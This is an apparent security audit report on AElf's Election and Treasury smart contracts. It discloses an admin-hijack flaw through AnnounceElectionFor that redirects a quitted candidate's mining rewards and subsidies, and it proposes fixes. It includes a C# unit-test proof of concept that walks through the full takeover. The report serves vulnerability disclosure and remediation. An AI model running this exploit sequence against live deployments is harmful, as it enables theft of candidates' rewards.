# Audit Report

## Title
Admin Hijacking via AnnounceElectionFor Enables ProfitsReceiver Redirect After Candidate Quits

## Summary
A critical vulnerability exists where any attacker can hijack a candidate's admin role after the candidate quits election, allowing the attacker to redirect all future mining rewards and backup subsidies to attacker-controlled addresses. The vulnerability stems from `QuitElection` failing to clear the `CandidateAdmins` mapping while `AnnounceElectionFor` lacks permission checks and unconditionally overwrites this mapping.

## Finding Description

**Root Cause Analysis:**

The `QuitElection` method sets `IsCurrentCandidate = false` and clears various state mappings (lines 252-277), but critically fails to clear the `CandidateAdmins` entry. [1](#0-0) 

The `AnnounceElectionFor` method has no permission checks on who can announce election for which pubkey. It unconditionally overwrites the admin mapping at line 128. [2](#0-1) 

The method calls the internal `AnnounceElection` helper which only validates that the pubkey is not already a current candidate (lines 154-157). [3](#0-2) 

**Exploitation Sequence:**

1. A legitimate candidate quits election via `QuitElection`, leaving `IsCurrentCandidate = false` but `CandidateAdmins[pubkey]` still populated
2. Attacker calls `AnnounceElectionFor(victim_pubkey, attacker_admin_address)`
3. The `!IsCurrentCandidate` check passes because the candidate has quit
4. The admin is overwritten with the attacker's address (line 128)
5. Attacker calls `SetProfitsReceiver` in the Treasury contract, which authorizes based on `GetCandidateAdmin` [4](#0-3) 
6. The `ProfitsReceiverMap` is updated to the attacker's address (line 620)

**Recovery Prevention:**

The `SetCandidateAdmin` method requires the caller to be either the Parliament default address or the current admin (lines 27-39). [5](#0-4)  Since the attacker is now the current admin, the original candidate cannot recover control.

The original candidate also cannot re-announce because `IsCurrentCandidate` is set back to true after the hijack (line 159).

**Reward Redirection Mechanism:**

When basic miner rewards are distributed, the `UpdateBasicMinerRewardWeights` method uses `GetProfitsReceiver(i.Pubkey)` to determine beneficiaries (line 816). [6](#0-5)  This method reads directly from the hijacked `ProfitsReceiverMap`. [7](#0-6) 

For backup candidate subsidies, the `AddBeneficiary` method calls `GetBeneficiaryAddress` (line 783) [8](#0-7)  which retrieves the profits receiver from the Treasury contract (lines 769-779). Both reward mechanisms are compromised.

## Impact Explanation

**Direct Financial Loss:**
- All miner rewards for the hijacked pubkey are permanently redirected to the attacker
- All backup candidate subsidies are permanently redirected to the attacker
- If the hijacked candidate later becomes a top miner, this represents substantial ongoing value theft

**Denial of Service:**
- The legitimate candidate permanently loses administrative control over their pubkey
- They cannot set their own profits receiver even with voting support
- Recovery requires complex Parliament governance intervention

**Affected Parties:**
- Any candidate who has quit election is immediately vulnerable
- Former miners who may return to consensus
- Backup candidates who temporarily withdraw

The vulnerability violates the core protocol invariant that profit distribution calculations and dividend settlement accuracy must be maintained, as it allows unauthorized redirection of treasury distributions.

## Likelihood Explanation

**Attacker Requirements:**
- 100,000 tokens to lock for election announcement (refundable)
- No special privileges or permissions required
- Ability to monitor blockchain for `QuitElection` events

**Attack Complexity:**
- Very low - Only two transactions required: (1) `AnnounceElectionFor`, (2) `SetProfitsReceiver`
- All steps are deterministic with no race conditions
- No timing constraints

**Preconditions:**
- A candidate must have quit election (common during term transitions or maintenance)
- Attack window is unbounded - persists indefinitely after quit

**Economic Incentive:**
- Attack cost: 100,000 tokens (refundable after attacker quits)
- Potential gain: All future mining/subsidy rewards, potentially millions in value
- Risk/reward ratio is extremely favorable

**Detection:**
- Difficult to detect until rewards distribution
- No on-chain alerts for admin changes
- High probability of successful exploitation

## Recommendation

**Fix 1: Clear admin mapping in QuitElection**

Add the following line to `QuitElection` after line 277:
```csharp
State.CandidateAdmins.Remove(initialPubkey);
```

**Fix 2: Add permission check to AnnounceElectionFor**

Add authorization check in `AnnounceElectionFor` before line 128:
```csharp
var existingAdmin = State.CandidateAdmins[pubkey];
if (existingAdmin != null && existingAdmin != new Address())
{
    Assert(Context.Sender == existingAdmin || Context.Sender == GetParliamentDefaultAddress(), 
        "Only existing admin or Parliament can re-announce for this pubkey.");
}
```

**Fix 3 (Recommended Combined Solution):**

Implement both fixes above. Additionally, consider adding an event emission when admin changes occur to improve monitoring and detection.

## Proof of Concept

```csharp
[Fact]
public async Task AdminHijackAfterQuit_ShouldRedirectRewards()
{
    // Setup: Initial candidate announces election
    var candidateKeyPair = SampleECKeyPairs.KeyPairs[0];
    var candidatePubkey = candidateKeyPair.PublicKey.ToHex();
    var adminAddress = Address.FromPublicKey(candidateKeyPair.PublicKey);
    
    // Candidate announces and becomes admin
    await ElectionContractStub.AnnounceElection.SendAsync(adminAddress);
    var initialAdmin = await ElectionContractStub.GetCandidateAdmin.CallAsync(
        new StringValue { Value = candidatePubkey });
    initialAdmin.ShouldBe(adminAddress);
    
    // Candidate quits election
    await ElectionContractStub.QuitElection.SendAsync(new StringValue { Value = candidatePubkey });
    
    // Verify candidate is no longer current
    var candidateInfo = await ElectionContractStub.GetCandidateInformation.CallAsync(
        new StringValue { Value = candidatePubkey });
    candidateInfo.IsCurrentCandidate.ShouldBeFalse();
    
    // VULNERABILITY: Admin mapping not cleared, still points to original
    var adminAfterQuit = await ElectionContractStub.GetCandidateAdmin.CallAsync(
        new StringValue { Value = candidatePubkey });
    adminAfterQuit.ShouldBe(adminAddress); // Still set!
    
    // EXPLOIT: Attacker announces election for victim's pubkey with attacker's admin
    var attackerKeyPair = SampleECKeyPairs.KeyPairs[1];
    var attackerAdmin = Address.FromPublicKey(attackerKeyPair.PublicKey);
    var attackerStub = GetElectionContractStub(attackerKeyPair);
    
    await attackerStub.AnnounceElectionFor.SendAsync(new AnnounceElectionForInput
    {
        Pubkey = candidatePubkey,
        Admin = attackerAdmin
    });
    
    // Admin is now hijacked
    var hijackedAdmin = await ElectionContractStub.GetCandidateAdmin.CallAsync(
        new StringValue { Value = candidatePubkey });
    hijackedAdmin.ShouldBe(attackerAdmin); // Attacker is now admin!
    
    // Attacker can now redirect all profits
    var attackerTreasuryStub = GetTreasuryContractStub(attackerKeyPair);
    await attackerTreasuryStub.SetProfitsReceiver.SendAsync(new SetProfitsReceiverInput
    {
        Pubkey = candidatePubkey,
        ProfitsReceiverAddress = attackerAdmin
    });
    
    // Verify profits receiver is now attacker's address
    var profitsReceiver = await TreasuryContractStub.GetProfitsReceiver.CallAsync(
        new StringValue { Value = candidatePubkey });
    profitsReceiver.ShouldBe(attackerAdmin); // All rewards go to attacker!
    
    // Original candidate cannot recover - transaction will fail
    var originalStub = GetElectionContractStub(candidateKeyPair);
    var exception = await Assert.ThrowsAsync<Exception>(async () =>
    {
        await originalStub.SetCandidateAdmin.SendAsync(new SetCandidateAdminInput
        {
            Pubkey = candidatePubkey,
            Admin = adminAddress
        });
    });
    exception.Message.ShouldContain("No permission");
}
```

## Notes

This vulnerability represents a critical flaw in the Election contract's state management. The root cause is an incomplete cleanup in `QuitElection` combined with insufficient authorization checks in `AnnounceElectionFor`. The attack is highly practical because:

1. Candidates frequently quit election during term transitions or for maintenance
2. The 100,000 token cost is refundable, making it economically viable
3. The attack window is unbounded - once a candidate quits, they remain vulnerable indefinitely
4. Detection is difficult as there are no events emitted for admin changes

The fix requires both defensive measures: proper cleanup in `QuitElection` and authorization checks in `AnnounceElectionFor`. Without both fixes, alternative attack vectors may still exist.

### Citations

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L19-57)
```csharp
    public override Empty SetCandidateAdmin(SetCandidateAdminInput input)
    {
        Assert(IsCurrentCandidateOrInitialMiner(input.Pubkey),
            "Pubkey is neither a current candidate nor an initial miner.");
        Assert(!IsPubkeyBanned(input.Pubkey), "Pubkey is already banned.");

        // Permission check
        var pubkey = State.InitialPubkeyMap[input.Pubkey] ?? input.Pubkey;
        if (Context.Sender != GetParliamentDefaultAddress())
        {
            if (State.CandidateAdmins[pubkey] == null)
            {
                // If admin is not set before (due to old contract code)
                Assert(Context.Sender == Address.FromPublicKey(ByteArrayHelper.HexStringToByteArray(input.Pubkey)),
                    "No permission.");
            }
            else
            {
                var oldCandidateAdmin = State.CandidateAdmins[pubkey];
                Assert(Context.Sender == oldCandidateAdmin, "No permission.");
            }
        }

        State.CandidateAdmins[pubkey] = input.Admin;

        var pubkeyByteString = ByteString.CopyFrom(ByteArrayHelper.HexStringToByteArray(pubkey));

        var newAdminManagedPubkeys = State.ManagedCandidatePubkeysMap[input.Admin] ?? new PubkeyList();
        if (!newAdminManagedPubkeys.Value.Contains(pubkeyByteString))
            newAdminManagedPubkeys.Value.Add(pubkeyByteString);
        State.ManagedCandidatePubkeysMap[input.Admin] = newAdminManagedPubkeys;

        var oldAdminManagedPubkeys = State.ManagedCandidatePubkeysMap[Context.Sender] ?? new PubkeyList();
        if (oldAdminManagedPubkeys.Value.Contains(pubkeyByteString))
            oldAdminManagedPubkeys.Value.Remove(pubkeyByteString);
        State.ManagedCandidatePubkeysMap[Context.Sender] = oldAdminManagedPubkeys;

        return new Empty();
    }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L121-142)
```csharp
    public override Empty AnnounceElectionFor(AnnounceElectionForInput input)
    {
        var pubkey = input.Pubkey;
        var pubkeyBytes = ByteArrayHelper.HexStringToByteArray(pubkey);
        var address = Address.FromPublicKey(pubkeyBytes);
        AnnounceElection(pubkeyBytes);
        var admin = input.Admin ?? Context.Sender;
        State.CandidateAdmins[pubkey] = admin;
        var managedPubkeys = State.ManagedCandidatePubkeysMap[admin] ?? new PubkeyList();
        managedPubkeys.Value.Add(ByteString.CopyFrom(pubkeyBytes));
        State.ManagedCandidatePubkeysMap[admin] = managedPubkeys;
        LockCandidateNativeToken();
        AddCandidateAsOption(pubkey);
        if (State.Candidates.Value.Value.Count <= GetValidationDataCenterCount())
        {
            State.DataCentersRankingList.Value.DataCenters.Add(pubkey, 0);
            RegisterCandidateToSubsidyProfitScheme(pubkey);
        }

        State.CandidateSponsorMap[input.Pubkey] = Context.Sender;
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L144-175)
```csharp
    private void AnnounceElection(byte[] pubkeyBytes)
    {
        var pubkey = pubkeyBytes.ToHex();
        var pubkeyByteString = ByteString.CopyFrom(pubkeyBytes);

        Assert(!State.InitialMiners.Value.Value.Contains(pubkeyByteString),
            "Initial miner cannot announce election.");

        var candidateInformation = State.CandidateInformationMap[pubkey];

        if (candidateInformation != null)
        {
            Assert(!candidateInformation.IsCurrentCandidate,
                $"This public key already announced election. {pubkey}");
            candidateInformation.AnnouncementTransactionId = Context.OriginTransactionId;
            candidateInformation.IsCurrentCandidate = true;
            // In this way we can keep history of current candidate, like terms, missed time slots, etc.
            State.CandidateInformationMap[pubkey] = candidateInformation;
        }
        else
        {
            Assert(!IsPubkeyBanned(pubkey), "This candidate already banned before.");
            State.CandidateInformationMap[pubkey] = new CandidateInformation
            {
                Pubkey = pubkey,
                AnnouncementTransactionId = Context.OriginTransactionId,
                IsCurrentCandidate = true
            };
        }

        State.Candidates.Value.Value.Add(pubkeyByteString);
    }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L252-277)
```csharp
        candidateInformation.IsCurrentCandidate = false;
        candidateInformation.AnnouncementTransactionId = Hash.Empty;
        State.CandidateInformationMap[pubkey] = candidateInformation;

        // Remove candidate public key from the Voting Item options.
        State.VoteContract.RemoveOption.Send(new RemoveOptionInput
        {
            VotingItemId = State.MinerElectionVotingItemId.Value,
            Option = pubkey
        });
        var dataCenterList = State.DataCentersRankingList.Value;
        if (dataCenterList.DataCenters.ContainsKey(pubkey))
        {
            dataCenterList.DataCenters[pubkey] = 0;
            UpdateDataCenterAfterMemberVoteAmountChanged(dataCenterList, pubkey, true);
            State.DataCentersRankingList.Value = dataCenterList;
        }

        var managedCandidatePubkey = State.ManagedCandidatePubkeysMap[Context.Sender];
        managedCandidatePubkey.Value.Remove(ByteString.CopyFrom(pubkeyBytes));
        if (managedCandidatePubkey.Value.Any())
            State.ManagedCandidatePubkeysMap[Context.Sender] = managedCandidatePubkey;
        else
            State.ManagedCandidatePubkeysMap.Remove(Context.Sender);

        State.CandidateSponsorMap.Remove(pubkey);
```

**File:** contract/AElf.Contracts.Treasury/TreasuryContract.cs (L601-629)
```csharp
    public override Empty SetProfitsReceiver(SetProfitsReceiverInput input)
    {
        if (State.ElectionContract.Value == null)
            State.ElectionContract.Value =
                Context.GetContractAddressByName(SmartContractConstants.ElectionContractSystemName);
        var pubkey = ByteString.CopyFrom(ByteArrayHelper.HexStringToByteArray(input.Pubkey));
        
        var admin = State.ElectionContract.GetCandidateAdmin.Call(new StringValue {Value = input.Pubkey});
        Assert(Context.Sender == admin , "No permission.");
        
        var candidateList = State.ElectionContract.GetCandidates.Call(new Empty());
        Assert(candidateList.Value.Contains(pubkey),"Pubkey is not a candidate.");

        var previousProfitsReceiver = State.ProfitsReceiverMap[input.Pubkey];
        //Set same profits receiver address.
        if (input.ProfitsReceiverAddress == previousProfitsReceiver)
        {
            return new Empty();
        }
        State.ProfitsReceiverMap[input.Pubkey] = input.ProfitsReceiverAddress;
        State.ElectionContract.SetProfitsReceiver.Send(new AElf.Contracts.Election.SetProfitsReceiverInput
        {
            CandidatePubkey = input.Pubkey,
            ReceiverAddress = input.ProfitsReceiverAddress,
            PreviousReceiverAddress = previousProfitsReceiver ?? new Address()
        });

        return new Empty();
    }
```

**File:** contract/AElf.Contracts.Treasury/TreasuryContract.cs (L651-655)
```csharp
    private Address GetProfitsReceiver(string pubkey)
    {
        return State.ProfitsReceiverMap[pubkey] ??
               Address.FromPublicKey(ByteArrayHelper.HexStringToByteArray(pubkey));
    }
```

**File:** contract/AElf.Contracts.Treasury/TreasuryContract.cs (L777-822)
```csharp
    private void UpdateBasicMinerRewardWeights(IReadOnlyCollection<Round> previousTermInformation)
    {
        if (previousTermInformation.First().RealTimeMinersInformation != null)
            State.ProfitContract.RemoveBeneficiaries.Send(new RemoveBeneficiariesInput
            {
                SchemeId = State.BasicRewardHash.Value,
                Beneficiaries =
                {
                    GetAddressesFromCandidatePubkeys(previousTermInformation.First().RealTimeMinersInformation.Keys)
                }
            });

        var averageProducedBlocksCount = CalculateAverage(previousTermInformation.Last().RealTimeMinersInformation
            .Values
            .Select(i => i.ProducedBlocks).ToList());
        // Manage weights of `MinerBasicReward`
        State.ProfitContract.AddBeneficiaries.Send(new AddBeneficiariesInput
        {
            SchemeId = State.BasicRewardHash.Value,
            EndPeriod = previousTermInformation.Last().TermNumber,
            BeneficiaryShares =
            {
                previousTermInformation.Last().RealTimeMinersInformation.Values.Select(i =>
                {
                    long shares;
                    if (State.IsReplacedEvilMiner[i.Pubkey])
                    {
                        // The new miner may have more shares than his actually contributes, but it's ok.
                        shares = i.ProducedBlocks;
                        // Clear the state asap.
                        State.IsReplacedEvilMiner.Remove(i.Pubkey);
                    }
                    else
                    {
                        shares = CalculateShares(i.ProducedBlocks, averageProducedBlocksCount);
                    }

                    return new BeneficiaryShare
                    {
                        Beneficiary = GetProfitsReceiver(i.Pubkey),
                        Shares = shares
                    };
                })
            }
        });
    }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Elector.cs (L781-816)
```csharp
    private void AddBeneficiary(string candidatePubkey, Address profitsReceiver = null)
    {
        var beneficiaryAddress = GetBeneficiaryAddress(candidatePubkey, profitsReceiver);
        var subsidyId = GenerateSubsidyId(candidatePubkey, beneficiaryAddress);
        State.ProfitContract.AddBeneficiary.Send(new AddBeneficiaryInput
        {
            SchemeId = State.SubsidyHash.Value,
            BeneficiaryShare = new BeneficiaryShare
            {
                Beneficiary = beneficiaryAddress,
                Shares = 1,
            },
            ProfitDetailId = subsidyId
        });
    }

    private void RemoveBeneficiary(string candidatePubkey, Address profitsReceiver = null)
    {
        var beneficiaryAddress = GetBeneficiaryAddress(candidatePubkey, profitsReceiver);
        var previousSubsidyId = GenerateSubsidyId(candidatePubkey, beneficiaryAddress);
        State.ProfitContract.RemoveBeneficiary.Send(new RemoveBeneficiaryInput
        {
            SchemeId = State.SubsidyHash.Value,
            Beneficiary = beneficiaryAddress,
            ProfitDetailId = previousSubsidyId
        });
    }

    private Address GetBeneficiaryAddress(string candidatePubkey, Address profitsReceiver = null)
    {
        profitsReceiver = profitsReceiver == null ? GetProfitsReceiverOrDefault(candidatePubkey) : profitsReceiver;
        var beneficiaryAddress = profitsReceiver.Value.Any()
            ? profitsReceiver
            : Address.FromPublicKey(ByteArrayHelper.HexStringToByteArray(candidatePubkey));
        return beneficiaryAddress;
    }
```
